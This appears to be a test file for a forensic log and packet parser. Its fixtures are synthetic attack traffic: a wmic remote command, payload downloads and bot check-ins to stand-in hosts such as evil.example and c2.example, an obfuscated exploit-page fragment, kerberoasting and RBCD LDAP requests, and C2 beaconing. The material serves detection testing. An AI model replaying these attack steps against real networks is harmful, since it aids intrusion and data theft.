from pathlib import Path

from dfa.ingestion.parsers.base import ParseContext, load_all, parser_for

_XML = """<?xml version="1.0" encoding="utf-8"?>
<Events>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}"/><EventID>4624</EventID><TimeCreated SystemTime="2026-09-01T13:42:07.123456Z"/><EventRecordID>48213</EventRecordID><Channel>Security</Channel><Computer>DC01.acme.local</Computer></System><EventData><Data Name="SubjectUserName">-</Data><Data Name="TargetUserName">svc_backup</Data><Data Name="TargetDomainName">ACME</Data><Data Name="LogonType">3</Data><Data Name="IpAddress">10.0.4.17</Data><Data Name="WorkstationName">WS042</Data><Data Name="LogonProcessName">Kerberos</Data><Data Name="AuthenticationPackageName">Kerberos</Data></EventData></Event>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><System><Provider Name="Microsoft-Windows-Sysmon" Guid="{5770385f-c22a-43e0-bf4c-06f5698ffbd9}"/><EventID>1</EventID><TimeCreated SystemTime="2026-09-01T13:47:02.000000Z"/><EventRecordID>9931</EventRecordID><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WS042.acme.local</Computer></System><EventData><Data Name="Image">C:\\Windows\\System32\\wbem\\WMIC.exe</Data><Data Name="CommandLine">wmic /node:DC01 process call create "cmd /c whoami"</Data><Data Name="User">ACME\\svc_backup</Data><Data Name="ParentImage">C:\\Windows\\System32\\cmd.exe</Data><Data Name="Hashes">SHA256=AB12CD34AB12CD34AB12CD34AB12CD34AB12CD34AB12CD34AB12CD34AB12CD34</Data></EventData></Event>
</Events>
"""


def test_evtx_xml(tmp_path: Path):
    load_all()
    f = tmp_path / "Security.xml"
    f.write_text(_XML)
    from dfa.ingestion.detect import detect

    assert detect(f).kind == "evtx_xml"
    evs = list(parser_for("evtx_xml").parse(f, ParseContext("c1")))
    assert len(evs) == 2
    e = evs[0]
    assert e.action == "logon_success" and e.host == "DC01.acme.local" and e.user == "svc_backup"
    assert e.ts_iso == "2026-09-01T13:42:07Z" and "10.0.4.17" in e.ioc.ip and e.record_ref == "record 48213"
    assert "Logon type 3 for ACME\\svc_backup from 10.0.4.17" in e.summary
    s = evs[1]
    assert s.action == "process_create" and s.process.endswith("WMIC.exe") and s.category.value == "process"
    assert "ab12cd34" in s.ioc.hash[0]


def test_pcap(tmp_path: Path):
    load_all()
    from scapy.all import DNS, DNSQR, DNSRR, IP, TCP, UDP, Ether, Raw, wrpcap

    t0 = 1756734422.0
    pkts = [
        Ether(dst="00:11:22:33:44:55") / IP(src="10.0.4.17", dst="10.0.0.53") / UDP(sport=51000, dport=53) / DNS(id=1, qr=0, qd=DNSQR(qname="evil.example.")),
        Ether(dst="00:11:22:33:44:55") / IP(src="10.0.0.53", dst="10.0.4.17") / UDP(sport=53, dport=51000) / DNS(id=1, qr=1, qd=DNSQR(qname="evil.example."), an=DNSRR(rrname="evil.example.", rdata="203.0.113.5")),
        Ether(dst="00:11:22:33:44:55") / IP(src="10.0.4.17", dst="203.0.113.5") / TCP(sport=52000, dport=80, flags="S"),
        Ether(dst="00:11:22:33:44:55") / IP(src="10.0.4.17", dst="203.0.113.5") / TCP(sport=52000, dport=80, flags="PA") / Raw(b"GET /payload.exe HTTP/1.1\r\nHost: evil.example\r\nUser-Agent: curl/8.0\r\n\r\n"),
    ]
    for i, p in enumerate(pkts):
        p.time = t0 + i
    f = tmp_path / "capture.pcap"
    wrpcap(str(f), pkts)
    from dfa.ingestion.detect import detect

    assert detect(f).kind == "pcap"
    evs = list(parser_for("pcap").parse(f, ParseContext("c1", host_hint="sensor")))
    actions = [e.action for e in evs]
    assert actions[:3] == ["dns_query", "dns_response", "http_request"]
    assert "evil.example" in evs[0].ioc.domain and evs[0].ts_iso == "2025-09-01T13:47:02Z"
    assert "203.0.113.5" in evs[1].ioc.ip
    assert "GET /payload.exe" in evs[2].summary and "curl/8.0" in evs[2].summary
    flows = [e for e in evs if e.action == "flow"]
    assert len(flows) == 2
    http = next(e for e in flows if e.extra["server_port"] == 80)
    assert http.extra["packets"] == 2 and "SYN" in http.summary


def test_pcap_http_response_reassembly(tmp_path: Path):
    import gzip

    load_all()
    from scapy.all import IP, TCP, Ether, Raw, wrpcap

    c, srv = "10.0.3.15", "192.168.56.52"
    exploit = (b"<html><body>404 Not Found<script>var s=unescape('%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090%u9090');"
               b"var CRYPT={signature:'CGerjg56R',_keyStr:'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='};eval(x)</script></body></html>")
    plain = b"<html><body>404 Not Found. The requested URL was not found on this server.</body></html>"
    gz = gzip.compress(plain)

    def pkt(src, dst, sport, dport, payload=None, flags="PA"):
        p = Ether() / IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags=flags)
        return p / Raw(payload) if payload else p

    head1 = b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: %d\r\n\r\n" % len(exploit)
    pkts = [
        pkt(c, srv, 1100, 80, b"GET /fg/show.php?s=1 HTTP/1.1\r\nHost: sploitme.example\r\nUser-Agent: MSIE 6.0\r\nReferer: http://lure.example/\r\n\r\n"),  # 1
        pkt(srv, c, 80, 1100, head1 + exploit[:40]),                                                                                        # 2
        pkt(srv, c, 80, 1100, exploit[40:]),                                                                                                # 3 -> response completes here
        pkt(c, srv, 1100, 80, b"GET /fg/show.php?s=1 HTTP/1.1\r\nHost: sploitme.example\r\n\r\n"),                                          # 4
        pkt(srv, c, 80, 1100, b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Encoding: gzip\r\nContent-Length: %d\r\n\r\n" % len(gz) + gz),  # 5
        pkt(c, srv, 1101, 8443, b"GET /fg/load.php?e=1 HTTP/1.1\r\nHost: sploitme.example\r\n\r\n"),                                        # 6 non-standard port
        pkt(srv, c, 8443, 1101, b"HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\n\r\nMZ\x90\x00PE\x00\x00 payload"
            + b"\x00" * 40 + b"-LIBGCCW32-EH-3-MINGW32\x00\x01\x02/build/cross_i386-mingw32-gcc/work/gcc-3.4.5-20060117-1/gcc/config/i386/w32-shared-ptr.c\x00"
            + b"KERNEL32.dll\x00CreateRemoteThread\x00" + b"\xff" * 30 + "http://c2.example/gate.php".encode("utf-16le") + b"\x00\x00zzzzzzzzzz"),  # 7 no length -> ends at FIN
        pkt(srv, c, 8443, 1101, flags="FA"),                                                                                                # 8
        pkt(c, "198.51.100.9", 1102, 6667, b"NICK bot1337\r\nUSER bot 0 * :bot\r\nJOIN #evil\r\n"),                                         # 9 IRC = unclaimed data
        pkt(c, srv, 1103, 80, b"POST /gate.php HTTP/1.1\r\nHost: sploitme.example\r\nContent-Length: 22\r\n\r\nid=42&os=winxp&av=none"),   # 10 POST with body
    ]
    for i, p in enumerate(pkts):
        p.time = 1264100000.0 + i
    f = tmp_path / "exploit.pcap"
    wrpcap(str(f), pkts)
    evs = list(parser_for("pcap").parse(f, ParseContext("c1")))
    req = [e for e in evs if e.action == "http_request"]
    res = [e for e in evs if e.action == "http_response"]
    assert [e.record_ref for e in req] == ["frame 1", "frame 4", "frame 6", "frame 10"] and req[0].extra["referer"] == "http://lure.example/"
    assert "body: id=42&os=winxp&av=none" in req[3].summary and req[3].extra["body_bytes"] == 22
    assert "(packet 1)" in req[0].summary and req[2].extra["uri"] == "/fg/load.php?e=1"
    assert [e.record_ref for e in res] == ["frame 3", "frame 5", "frame 8"]
    a, b, d = res
    assert a.extra["first_frame"] == 2 and a.extra["request_frame"] == 1 and a.extra["status"] == 200
    assert {"script", "obfuscated_js", "shellcode"} <= set(a.extra["flags"]) and "no_script" not in a.extra["flags"]
    assert "(packet 3) for GET /fg/show.php?s=1" in a.summary and "[script obfuscated_js shellcode]" in a.summary
    assert b.extra["flags"] == ["no_script"] and b.extra["decoded_bytes"] == len(plain) and "not found on this server" in b.summary
    assert d.extra["flags"] == ["pe_file"] and d.extra["last_frame"] == 8 and "8443" in d.summary
    assert "192.168.56.52" in a.ioc.ip and "10.0.3.15" in a.ioc.ip
    # body content is indexed: strings of the binary (compiler banner first), text of the exploit page
    bodies = [e for e in evs if e.action == "http_body"]
    pe = next(e for e in bodies if e.extra["kind"] == "pe_file")
    assert pe.record_ref == "frame 8 body 1/1" and pe.extra["response_frame"] == 8 and pe.extra["uri"] == "/fg/load.php?e=1"
    assert "gcc-3.4.5-20060117-1" in pe.summary and "MINGW32" in pe.summary and "http://c2.example/gate.php" in pe.summary
    assert pe.summary.index("gcc-3.4.5") < pe.summary.index("zzzzzzzzzz")  # notable strings come first
    assert "c2.example" in pe.ioc.domain
    txt = next(e for e in bodies if e.extra["response_frame"] == 3)
    assert txt.extra["kind"] == "text" and "unescape" in txt.summary and "part 1/1" in txt.summary
    # unclaimed payloads become data events
    data = [e for e in evs if e.action == "tcp_data"]
    assert len(data) == 1 and data[0].record_ref == "frame 9" and "NICK bot1337" in data[0].summary and "6667 (irc)" in data[0].summary
    assert "198.51.100.9" in data[0].ioc.ip


def test_pcap_kerberos_ldap_beacon_domains(tmp_path: Path):
    load_all()
    from scapy.all import DNS, DNSQR, DNSRR, IP, TCP, UDP, Ether, wrpcap
    from scapy.asn1.asn1 import (
        ASN1_BOOLEAN,
        ASN1_ENUMERATED,
        ASN1_GENERAL_STRING,
        ASN1_INTEGER,
        ASN1_STRING,
    )
    from scapy.layers.kerberos import (
        KRB_AS_REP,
        KRB_AS_REQ,
        KRB_ERROR,
        KRB_KDC_REQ_BODY,
        KRB_TGS_REP,
        KRB_TGS_REQ,
        PA_PAC_REQUEST,
        PADATA,
        EncryptedData,
        Kerberos,
        KerberosTCPHeader,
        KRB_Ticket,
        PrincipalName,
    )
    from scapy.layers.ldap import (
        LDAP,
        LDAP_AttributeValue,
        LDAP_Authentication_simple,
        LDAP_BindRequest,
        LDAP_BindResponse,
        LDAP_Filter,
        LDAP_FilterAnd,
        LDAP_FilterEqual,
        LDAP_FilterPresent,
        LDAP_ModifyRequest,
        LDAP_ModifyRequestChange,
        LDAP_PartialAttribute,
        LDAP_SearchRequest,
        LDAP_SearchRequestAttribute,
        LDAP_SearchResponseEntry,
        LDAP_SearchResponseResultDone,
    )

    ws, dc, c2 = "10.0.4.17", "10.0.0.10", "203.0.113.77"
    gs = ASN1_GENERAL_STRING
    krbtgt = PrincipalName(nameType=ASN1_INTEGER(2), nameString=[gs(b"krbtgt"), gs(b"ACME.LOCAL")])
    sql = PrincipalName(nameType=ASN1_INTEGER(2), nameString=[gs(b"MSSQLSvc"), gs(b"sql01.acme.local:1433")])
    jdoe = PrincipalName(nameType=ASN1_INTEGER(1), nameString=[gs(b"jdoe")])
    realm = gs(b"ACME.LOCAL")

    def udp(src, dst, sport, dport, payload):
        return Ether() / IP(src=src, dst=dst) / UDP(sport=sport, dport=dport) / payload

    def tcp(src, dst, sport, dport, payload=None, flags="PA"):
        p = Ether() / IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags=flags)
        return p / payload if payload is not None else p

    pkts = [
        # 1-2: AS-REQ without pre-auth -> KDC says pre-auth required
        udp(ws, dc, 50001, 88, Kerberos(root=KRB_AS_REQ(reqBody=KRB_KDC_REQ_BODY(cname=jdoe, realm=realm, sname=krbtgt, etype=[ASN1_INTEGER(18), ASN1_INTEGER(23)])))),
        udp(dc, ws, 88, 50001, Kerberos(root=KRB_ERROR(errorCode=ASN1_INTEGER(25), realm=realm, sname=krbtgt))),
        # 3-4: AS-REQ with encrypted timestamp -> wrong password
        udp(ws, dc, 50002, 88, Kerberos(root=KRB_AS_REQ(padata=[PADATA(padataType=ASN1_INTEGER(2), padataValue=EncryptedData(etype=ASN1_INTEGER(18), cipher=ASN1_STRING(b"z" * 40))),
                                                               PADATA(padataType=ASN1_INTEGER(128), padataValue=PA_PAC_REQUEST(includePac=ASN1_BOOLEAN(True)))],
                                                       reqBody=KRB_KDC_REQ_BODY(cname=jdoe, realm=realm, sname=krbtgt, etype=[ASN1_INTEGER(18)])))),
        udp(dc, ws, 88, 50002, Kerberos(root=KRB_ERROR(errorCode=ASN1_INTEGER(24), crealm=realm, cname=jdoe, realm=realm, sname=krbtgt))),
        # 5: AS-REP (TGT) for jdoe
        udp(dc, ws, 88, 50003, Kerberos(root=KRB_AS_REP(crealm=realm, cname=jdoe, ticket=KRB_Ticket(realm=realm, sname=krbtgt, encPart=EncryptedData(etype=ASN1_INTEGER(18), cipher=ASN1_STRING(b"x" * 32))),
                                                        encPart=EncryptedData(etype=ASN1_INTEGER(18), cipher=ASN1_STRING(b"y" * 32))))),
        # 6-7: TGS-REQ asking RC4 only for an SPN (kerberoasting), RC4 service ticket comes back, over TCP
        tcp(ws, dc, 50004, 88, KerberosTCPHeader() / Kerberos(root=KRB_TGS_REQ(reqBody=KRB_KDC_REQ_BODY(realm=realm, sname=sql, etype=[ASN1_INTEGER(23)])))),
        tcp(dc, ws, 88, 50004, KerberosTCPHeader() / Kerberos(root=KRB_TGS_REP(crealm=realm, cname=jdoe, ticket=KRB_Ticket(realm=realm, sname=sql, encPart=EncryptedData(etype=ASN1_INTEGER(23), cipher=ASN1_STRING(b"x" * 32))),
                                                                               encPart=EncryptedData(etype=ASN1_INTEGER(18), cipher=ASN1_STRING(b"y" * 32))))),
        # 8-9: LDAP simple bind with a clear-text password, rejected (52e = bad password)
        tcp(ws, dc, 50005, 389, LDAP(messageID=1, protocolOp=LDAP_BindRequest(version=3, bind_name=ASN1_STRING(b"CN=jdoe,CN=Users,DC=acme,DC=local"), authentication=LDAP_Authentication_simple(b"Summer2026!")))),
        tcp(dc, ws, 389, 50005, LDAP(messageID=1, protocolOp=LDAP_BindResponse(resultCode=ASN1_ENUMERATED(49), matchedDN=ASN1_STRING(b""), diagnosticMessage=ASN1_STRING(b"80090308: LdapErr: DSID-0C09041C, comment: AcceptSecurityContext error, data 52e, v2580")))),
        # 10-11: second bind succeeds
        tcp(ws, dc, 50005, 389, LDAP(messageID=2, protocolOp=LDAP_BindRequest(version=3, bind_name=ASN1_STRING(b"CN=jdoe,CN=Users,DC=acme,DC=local"), authentication=LDAP_Authentication_simple(b"Summer2026!!")))),
        tcp(dc, ws, 389, 50005, LDAP(messageID=2, protocolOp=LDAP_BindResponse(resultCode=ASN1_ENUMERATED(0), matchedDN=ASN1_STRING(b""), diagnosticMessage=ASN1_STRING(b"")))),
        # 12-15: kerberoast enumeration search, two entries, done
        tcp(ws, dc, 50005, 389, LDAP(messageID=3, protocolOp=LDAP_SearchRequest(baseObject=ASN1_STRING(b"DC=acme,DC=local"), scope=ASN1_ENUMERATED(2),
                                                                                  filter=LDAP_Filter(filter=LDAP_FilterAnd(vals=[LDAP_Filter(filter=LDAP_FilterEqual(attributeType=ASN1_STRING(b"objectClass"), attributeValue=ASN1_STRING(b"user"))),
                                                                                                                                 LDAP_Filter(filter=LDAP_FilterPresent(present=ASN1_STRING(b"servicePrincipalName")))])),
                                                                                  attributes=[LDAP_SearchRequestAttribute(type=ASN1_STRING(b"sAMAccountName")), LDAP_SearchRequestAttribute(type=ASN1_STRING(b"servicePrincipalName"))]))),
        tcp(dc, ws, 389, 50005, LDAP(messageID=3, protocolOp=LDAP_SearchResponseEntry(objectName=ASN1_STRING(b"CN=svc_sql,CN=Users,DC=acme,DC=local"), attributes=[LDAP_PartialAttribute(type=ASN1_STRING(b"sAMAccountName"), values=[LDAP_AttributeValue(value=ASN1_STRING(b"svc_sql"))])]))),
        tcp(dc, ws, 389, 50005, LDAP(messageID=3, protocolOp=LDAP_SearchResponseEntry(objectName=ASN1_STRING(b"CN=svc_web,CN=Users,DC=acme,DC=local"), attributes=[]))),
        tcp(dc, ws, 389, 50005, LDAP(messageID=3, protocolOp=LDAP_SearchResponseResultDone(resultCode=ASN1_ENUMERATED(0), matchedDN=ASN1_STRING(b""), diagnosticMessage=ASN1_STRING(b"")))),
        # 16: RBCD-style modify
        tcp(ws, dc, 50005, 389, LDAP(messageID=4, protocolOp=LDAP_ModifyRequest(object=ASN1_STRING(b"CN=FILE01,CN=Computers,DC=acme,DC=local"),
                                                                                  changes=[LDAP_ModifyRequestChange(operation=ASN1_ENUMERATED(2), modification=LDAP_PartialAttribute(type=ASN1_STRING(b"msDS-AllowedToActOnBehalfOfOtherIdentity"), values=[LDAP_AttributeValue(value=ASN1_STRING(b"\x01\x00\x04"))]))]))),
    ]
    t0 = 1757000000.0
    for i, p in enumerate(pkts):
        p.time = t0 + i
    # beacon: 12 SYNs to c2:443 every 60 s (+-2 s), plus 12 DNS queries for a DGA-looking name; a normal domain queried by two clients
    beat = 12
    for k in range(beat):
        syn = tcp(ws, c2, 40000 + k, 443, flags="S")
        syn.time = t0 + 100 + k * 60 + (k % 3) - 1
        pkts.append(syn)
        q = udp(ws, dc, 41000 + k, 53, DNS(id=k, qr=0, qd=DNSQR(qname=f"c{k}.xkqzvbtrwplmgd.top.")))
        q.time = t0 + 100 + k * 60
        pkts.append(q)
    common = [
        udp(ws, dc, 42000, 53, DNS(id=200, qr=0, qd=DNSQR(qname="www.example.com."))),
        udp("10.0.4.18", dc, 42001, 53, DNS(id=201, qr=0, qd=DNSQR(qname="www.example.com."))),
        udp(ws, dc, 42002, 53, DNS(id=202, qr=0, qd=DNSQR(qname="update.rare-vendor.net."))),
        udp(dc, ws, 53, 42002, DNS(id=202, qr=1, qd=DNSQR(qname="update.rare-vendor.net."), an=DNSRR(rrname="update.rare-vendor.net.", rdata="198.51.100.20"))),
        udp(ws, dc, 42003, 53, DNS(id=203, qr=0, qd=DNSQR(qname="gone.nowhere-zzz.org."))),
        udp(dc, ws, 53, 42003, DNS(id=203, qr=1, rcode=3, qd=DNSQR(qname="gone.nowhere-zzz.org."))),
    ]
    for i, p in enumerate(common):
        p.time = t0 + 2000 + i
    pkts += common
    f = tmp_path / "ad.pcap"
    wrpcap(str(f), pkts)
    evs = list(parser_for("pcap").parse(f, ParseContext("c1")))
    by = {}
    for e in evs:
        by.setdefault(e.action, []).append(e)

    # Kerberos
    asreq = by["krb_as_req"]
    assert len(asreq) == 2 and asreq[0].user == "jdoe" and "no_preauth" in asreq[0].extra["flags"] and "AES256,RC4-HMAC" in asreq[0].summary
    assert asreq[1].extra["padata"] == ["PA-ENC-TIMESTAMP", "PA-PAC-REQUEST"] and "no_preauth" not in asreq[1].extra["flags"]
    errs = by["krb_error"]
    assert [e.extra["error_name"] for e in errs] == ["KDC_ERR_PREAUTH_REQUIRED", "KDC_ERR_PREAUTH_FAILED"]
    assert "bad_password" in errs[1].extra["flags"] and errs[1].user == "jdoe" and errs[1].category.value == "authentication"
    assert errs[0].user == "jdoe"  # cname missing on the error, taken from the AS-REQ of that client
    rep = by["krb_as_rep"][0]
    assert rep.user == "jdoe" and rep.extra["service"] == "krbtgt/ACME.LOCAL" and rep.extra["ticket_etype"] == "AES256"
    tgs = by["krb_tgs_req"][0]
    assert tgs.extra["service"] == "MSSQLSvc/sql01.acme.local:1433" and "rc4_only_service_request" in tgs.extra["flags"]
    assert tgs.user == "jdoe" and "client last authenticated as jdoe" in tgs.summary and tgs.record_ref == "frame 6"
    tgsrep = by["krb_tgs_rep"][0]
    assert "rc4_service_ticket" in tgsrep.extra["flags"] and "ticket_etype=RC4-HMAC" in tgsrep.summary

    # LDAP
    binds = by["ldap_bind"]
    assert len(binds) == 2 and binds[0].user == "CN=jdoe,CN=Users,DC=acme,DC=local" and "cleartext_password" in binds[0].extra["flags"]
    assert "11 chars" in binds[0].summary and "Summer2026" not in binds[0].summary
    results = by["ldap_bind_result"]
    assert results[0].extra["result_name"] == "invalidCredentials" and "bad_password" in results[0].extra["flags"] and results[0].user == binds[0].user
    assert results[1].extra["result_code"] == 0
    search = by["ldap_search"][0]
    assert search.extra["filter"] == "(&(objectClass=user)(servicePrincipalName=*))" and search.extra["scope"] == "sub"
    assert "kerberoast_enum" in search.extra["flags"] and search.user == binds[0].user and "by CN=jdoe" in search.summary
    assert "ldap_search_entry" not in by
    done = by["ldap_search_done"][0]
    assert "entries=2" in done.summary and "svc_sql" in done.summary and done.extra["filter"] == search.extra["filter"] and "kerberoast_enum" in done.extra["flags"]
    mod = by["ldap_modify"][0]
    assert mod.category.value == "user_management" and mod.extra["changes"] == ["replace msDS-AllowedToActOnBehalfOfOtherIdentity"]
    assert "sensitive_attribute:msDS-AllowedToActOnBehalfOfOtherIdentity" in mod.extra["flags"] and "FILE01" in mod.summary

    # beaconing
    beacons = by["beacon_candidate"]
    kinds = {(b.extra["kind"], b.extra["target"]) for b in beacons}
    assert ("tcp_connect", f"{c2}:443") in kinds and ("dns_query", "xkqzvbtrwplmgd.top") not in kinds  # DNS names differ per query
    tb = next(b for b in beacons if b.extra["kind"] == "tcp_connect")
    assert tb.extra["count"] == beat and 58 <= tb.extra["median_interval_s"] <= 62 and tb.extra["jitter"] < 0.1 and c2 in tb.ioc.ip
    assert "regular tcp connect every ~6" in tb.summary and tb.record_ref == "beacon 1"

    # rare / suspicious domains
    doms = {d.extra["domain"]: d for d in by["rare_domain"]}
    assert "example.com" not in doms  # two clients
    assert "dga_like" in doms["xkqzvbtrwplmgd.top"].extra["flags"] and doms["xkqzvbtrwplmgd.top"].extra["queries"] == beat
    assert doms["rare-vendor.net"].extra["flags"] == ["rare"] and doms["rare-vendor.net"].extra["answers"] == ["198.51.100.20"]
    assert "198.51.100.20" in doms["rare-vendor.net"].ioc.ip and "rare-vendor.net" in doms["rare-vendor.net"].ioc.domain
    assert "mostly_nxdomain" in doms["nowhere-zzz.org"].extra["flags"]
    nx = [e for e in by["dns_response"] if e.extra.get("rcode") == 3]
    assert len(nx) == 1 and "NXDOMAIN for gone.nowhere-zzz.org" in nx[0].summary
    # the AD packets are not double-counted as unclaimed data
    assert "tcp_data" not in by and "udp_data" not in by
